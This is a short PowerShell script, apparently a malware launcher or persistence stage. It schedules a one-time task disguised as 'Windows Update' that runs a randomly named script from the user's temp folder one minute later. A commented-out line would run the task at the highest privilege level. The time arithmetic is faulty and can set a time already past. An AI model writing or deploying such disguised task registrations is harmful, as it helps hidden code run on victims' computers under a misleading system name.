$t = Get-Date -Format "hh:mm"
$lastchar = $t.substring($t.length -1, 1)
$o = [int]$lastchar + 1
if ($o -ge 10) {
    $o = 0
}
$a = $t.substring(0, 4)
$ofday = Get-Date -format tt
$time = "$a$o$ofday"
$Timeset=New-ScheduledTaskTrigger -At "$time" -Once; $Action=New-ScheduledTaskAction -Execute PowerShell.exe -WorkingDirectory $env:temp -Argument “TOhjZsWluf.ps1”; Register-ScheduledTask -TaskName "Windows Update" -Trigger $Timeset -Action $Action 
# -RunLevel Highest
